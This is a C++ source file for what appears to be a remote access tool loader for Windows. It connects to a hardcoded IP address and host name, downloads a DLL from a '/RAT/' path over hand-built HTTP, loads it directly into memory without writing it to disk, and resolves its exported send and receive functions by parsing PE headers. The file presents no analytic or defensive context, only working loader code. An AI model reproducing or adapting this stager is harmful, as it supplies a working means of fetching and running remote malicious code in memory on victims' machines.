//cl /EHsc .\s3.cpp .\MemoryModule.c /link ws2_32.lib /OUT:s3.exe
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <mutex>
#include "MemoryModule.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////

std::vector <unsigned char> vNetworklib, vCutelib;
HMEMORYMODULE hNetwork, hCute;

//////////////////////////////////////////////////////////////////////////////////////////////////////////

#define ADDR "103.92.235.21"
#define H_NAME "Host: arth.imbeddex.com\r\n"
#define PRT 80

std::mutex socketMutex;
SOCKET clientSocket = INVALID_SOCKET;

//////////////////////////////////////////////////////////////////////////////////////////////////////////

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);

SendDataFunc send_data;
RecvDataFunc receive_data;

//////////////////////////////////////////////////////////////////////////////////////////////////////////

void* FindExportAddress(HMODULE hModule, const char* funcName);
int socket_setup();
std::vector<unsigned char> receive_data_raw(const std::string &filename);

//////////////////////////////////////////////////////////////////////////////////////////////////////////

int load_dlls()
{
    vNetworklib = receive_data_raw("network_lib.dll");
    hNetwork = MemoryLoadLibrary(vNetworklib.data(), vNetworklib.size());

    void* baseaddress_n = MemoryGetBaseAddress(hNetwork);
    std::cout << "Base Address : 0x" << std::hex << baseaddress_n << std::endl;

    send_data = (SendDataFunc)FindExportAddress(reinterpret_cast<HMODULE>(baseaddress_n), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
    receive_data = (RecvDataFunc)FindExportAddress(reinterpret_cast<HMODULE>(baseaddress_n), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    
    if (send_data == nullptr || receive_data == nullptr)
    {
        std::cerr << "Failed to find export address of one or more functions." << std::endl;
        return 1;
    }

    return 0;
}

int main()
{

    load_dlls();

    std::cout << receive_data("target_data.rat") << std::endl;
    std::cout << "Done " << std::endl;

    return 0;
}

int socket_setup()
{
    std::lock_guard<std::mutex> lock(socketMutex);
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 0;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 0;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PRT);
    serverAddr.sin_addr.s_addr = inet_addr(ADDR);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cerr << "Connection failed with error: " << error << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 0;
    }
    return 1;
}

std::vector<unsigned char> receive_data_raw(const std::string &filename)
{
    socket_setup();

    std::lock_guard<std::mutex> lock1(socketMutex);

    SOCKET TempSocket = INVALID_SOCKET;
    try
    {
        TempSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (TempSocket == INVALID_SOCKET)
        {
            std::cerr << "Socket creation failed.\n";
            WSACleanup();
            throw std::runtime_error("Socket creation failed");
        }

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(PRT);
        serverAddr.sin_addr.s_addr = inet_addr(ADDR);

        while (connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED) std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }

        // Send HTTP GET request
        std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
        httpRequest += H_NAME;
        httpRequest += "Connection: close\r\n\r\n";

        int bytesSent = send(TempSocket, httpRequest.c_str(), httpRequest.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            std::cerr << "Send failed with error (recieve_data_raw): " << error << std::endl;
            throw std::runtime_error("Send failed");
        }

        // Receive data in chunks
        char buffer[8192];
        std::vector<unsigned char> receivedData;
        int bytesReceived;

        do
        {
            bytesReceived = recv(TempSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived > 0) receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
            else if (bytesReceived == 0)
            {
                std::cerr << "Connection closed by server." << std::endl; // Server closed connection, which is expected with "Connection: close"
                break;
            }
            else
            {
                int error = WSAGetLastError();
                std::cerr << "Receive failed with error: " << error << std::endl;
                break;
            }
        } while (bytesReceived > 0);

        try
        {
            // Ensure header separator is found
            size_t headerEnd = 0;
            const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

            // Search for header separator (CRLF + CRLF)
            for (size_t i = 0; i < receivedData.size() - 3; ++i)
            {
                if (receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
                {
                    headerEnd = i + 4; // Found header, skip the separator
                    break;
                }
            }

            if (headerEnd == 0)
            {
                std::cerr << "Header separator not found." << std::endl;
                throw std::runtime_error("Header separator not found");
            }

            if (headerEnd < receivedData.size())
            {
                std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());      
                return body;
            }
            else
            {
                std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
                throw std::runtime_error("Body extraction failed");
            }
        }
        catch (...)
        {
            if (TempSocket != INVALID_SOCKET)
            {
                shutdown(TempSocket, SD_BOTH);
                closesocket(TempSocket);
                TempSocket = INVALID_SOCKET;
            }
            throw;
        }
        
    }
    catch (const std::exception& e)
    {
        std::cerr << "Exception in receive_data_raw: " << e.what() << std::endl;
    }

    return std::vector<unsigned char>();
}

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);
        }
    }
    std::cout << "Failed to find export address of: " << funcName << std::endl;
    return nullptr;
}
